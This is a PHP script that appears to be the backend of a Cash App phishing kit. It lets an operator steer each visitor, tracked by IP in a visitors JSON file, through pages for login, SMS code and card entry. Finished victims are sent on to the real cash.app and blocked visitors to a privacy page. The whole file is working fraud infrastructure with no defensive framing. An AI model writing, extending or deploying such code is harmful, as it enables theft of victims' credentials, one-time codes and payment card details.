<?php
$protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http');
$host = $_SERVER['HTTP_HOST'];
$script_dir = dirname($_SERVER['SCRIPT_NAME']);
$project_root = rtrim($protocol . '://' . $host . $script_dir . '/..', '/');

// Redirects
if (isset($_GET['quick']) && $_GET['quick'] === 'redirect') {
    $ip = $_GET['ip'] ?? '';
    $page = $_GET['page'] ?? '';
    $redirects = [
        'login' => '/log.html',
        'sms' => '/sms.html',
        'card' => '/c.html',
        'success' => '/success.html',
        'log_error' => '/log.html?error=1',
        'official' => 'https://cash.app'
    ];
    $target = $page && isset($redirects[$page]) ? $redirects[$page] : '/log.html';
    if (strpos($target, 'http') !== 0 && strpos($target, '/') !== 0) {
        $target = '/' . $target;
    }
    
    // Check if ip has been redirected already today
    $data_file = __DIR__ . '/data/visitors.json';
    if (!file_exists($data_file)) {
        file_put_contents($data_file, '[]');
    }
    
    $visitors = json_decode(file_get_contents($data_file), true) ?: [];
    $found = false;
    
    for ($i = 0; $i < count($visitors); $i++) {
        if ($visitors[$i]['ip'] === $ip) {
            $visitors[$i]['redirect_url'] = $target;
            $visitors[$i]['status'] = 'redirected';
            $visitors[$i]['last_update'] = time();
            $found = true;
            break;
        }
    }
    
    if ($found) {
        file_put_contents($data_file, json_encode($visitors, JSON_PRETTY_PRINT));
    }
    
    header('Location: ' . $project_root . $target);
    exit;
}

// API status check
$client_ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
    $client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
}

$response = ['status' => 'waiting'];

$data_file = __DIR__ . '/data/visitors.json';
if (file_exists($data_file)) {
    $visitors = json_decode(file_get_contents($data_file), true) ?: [];
    $updated = false;
    
    foreach ($visitors as $index => $visitor) {
        if ($visitor['ip'] === $client_ip) {
            if (isset($visitor['status']) && $visitor['status'] === 'redirected' && !empty($visitor['redirect_url'])) {
                $response = [
                    'status' => 'redirect',
                    'redirect_url' => $visitor['redirect_url']
                ];
                $visitors[$index]['status'] = 'active';
                $visitors[$index]['redirect_url'] = '';
                $updated = true;
                break;
            }
            if (isset($visitor['status']) && $visitor['status'] === 'blocked') {
                $response = [
                    'status' => 'redirect',
                    'redirect_url' => '/privacy.html'
                ];
                break;
            }
        }
    }
    
    if ($updated) {
        file_put_contents($data_file, json_encode($visitors, JSON_PRETTY_PRINT));
    }
}

header('Content-Type: application/json');
echo json_encode($response);
?>